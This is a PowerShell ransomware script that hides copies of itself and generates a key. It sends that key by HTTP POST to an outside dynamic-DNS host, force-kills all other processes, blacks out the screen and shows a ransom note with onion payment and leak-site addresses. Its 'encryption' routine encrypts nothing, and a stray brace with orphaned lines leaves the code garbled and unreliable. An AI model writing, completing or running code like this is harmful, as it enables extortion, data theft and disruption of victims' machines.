# Set the execution policy to allow the script to run
Set-ExecutionPolicy Bypass -Scope Process -Force

# Function to encrypt directories using AES encryption
function Encrypt-Directories {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Password
    )
    
    # Encrypt directories recursively in the current directory
    Get-ChildItem -Directory -Recurse | ForEach-Object {
        $encryptedDirectoryPath = "$($_.FullName).encrypted"
        # Encrypt the directory using AES encryption
        ConvertTo-SecureString -String $Password -AsPlainText -Force | ConvertFrom-SecureString | Out-File $encryptedDirectoryPath
    }
}

# Function to create a remote connection
function Create-RemoteConnection {
    param (
        [Parameter(Mandatory=$true)]
        [string]$DNSAddress,
        [Parameter(Mandatory=$true)]
        [string]$Password
    )
    
    # Establish a remote connection to the specified DNS address
    # Simulate sending data over DNS by making an HTTP request to a server
    $url = "http://$DNSAddress"
    $postData = "password=$Password"
    
    try {
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
        Write-Host "Connection established. Response from server: $($response)"
    }
    catch {
        Write-Host "Failed to establish connection: $_"
    }
}
    
    # Send the encryption password over DNS
    $encodedPassword = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Password))
    $dnsMessage = "Password:$encodedPassword"
    # Implement functionality to send DNS message
}

# Function to stop running processes except for this script
function Stop-Processes {
    # Stop all running processes except for this script
    $scriptProcessName = $MyInvocation.MyCommand.Name
    Get-Process | Where-Object { $_.ProcessName -ne $scriptProcessName } | ForEach-Object {
        Stop-Process -Id $_.Id -Force
    }
}

# Function to make the screen black until Ctrl + Q is pressed
function Make-ScreenBlack {
    # Create a black window that takes up the entire screen
    Add-Type -TypeDefinition @"
    using System;
    using System.Drawing;
    using System.Windows.Forms;
    
    public class BlackScreenForm : Form {
        public BlackScreenForm() {
            FormBorderStyle = FormBorderStyle.None;
            BackColor = Color.Black;
            Opacity = 1;
            WindowState = FormWindowState.Maximized;
            TopMost = true;
            KeyPreview = true;
            KeyDown += new KeyEventHandler(BlackScreenForm_KeyDown);
        }

        private void BlackScreenForm_KeyDown(object sender, KeyEventArgs e) {
            // Exit black screen when Ctrl + Q is pressed
            if (e.Control && e.KeyCode == Keys.Q) {
                this.Close();
            }
        }
    }
"@
    # Display the black window
    $blackScreenForm = New-Object BlackScreenForm
    $blackScreenForm.ShowDialog()
}

# Function to display ransom message
function Display-RansomMessage {
    # Display ransom message on top of a black screen
    # For demonstration purposes, we'll print the message
    $ransomMessage = @"
Attention!
Your files have been encrypted.
We highly suggest not shutting down your computer in case encryption process is not finished, as your files may get corrupted.
In order to decrypt your files, you must pay for the decryption key & application.
You may do so by visiting us at http://avosjon4pfh3y7ew3jdwz6ofw7lljcxlbk7hcxxmnxlh5kvf2akcqjad.onion.
This is an onion address that you may access using Tor Browser which you may download at https://www.torproject.org/download/
Details such as pricing, how long before the price increases and such will be available to you once you enter your ID presented to you below in this note in our website.
Contact us soon, because those who don't have their data leaked in our press release blog and the price they'll have to pay will go up significantly.
The corporations whom don't pay or fail to respond in a swift manner can be found in our blog, accessible at http://avosqxh72b5ia23dl5fgwcpndkctuzqvh2iefk5imp3pi5gfhel5klad.onion

Your ID: $env:COMPUTERNAME-$(Get-Random)
"@
    Write-Host $ransomMessage
}

# Make the program run in the background and change the process name to a random name
$randomProcessName = [System.IO.Path]::GetRandomFileName()
$host.UI.RawUI.WindowTitle = $randomProcessName

# Create copies of the script in hidden locations
$scriptPath = $MyInvocation.MyCommand.Path
$appDataPath = [Environment]::GetFolderPath("ApplicationData")
$randomDrive = Get-Volume | Where-Object { $_.DriveLetter } | Get-Random
$randomDrivePath = "$($randomDrive.DriveLetter):\"
$hiddenScriptPath1 = Join-Path -Path $appDataPath -ChildPath ($randomProcessName + ".ps1")
$hiddenScriptPath2 = Join-Path -Path $randomDrivePath -ChildPath ($randomProcessName + ".ps1")
Copy-Item -Path $scriptPath -Destination $hiddenScriptPath1 -Force
Copy-Item -Path $scriptPath -Destination $hiddenScriptPath2 -Force
Set-ItemProperty -Path $hiddenScriptPath1 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
Set-ItemProperty -Path $hiddenScriptPath2 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Generate a random password
$randomPassword = [System.Web.Security.Membership]::GeneratePassword((Get-Random -Minimum 20 -Maximum 30), 3)

# Encrypt directories with the random password
Encrypt-Directories -Password $randomPassword

# Send the encryption password over DNS
Create-RemoteConnection -DNSAddress "examplednstest00238367.ddns.net" -Password $randomPassword

# Stop any running processes or running apps except for this PowerShell script
Stop-Processes

# Make the screen black until Ctrl + Q is pressed
Make-ScreenBlack

# Display ransom message on top of the black screen
Display-RansomMessage

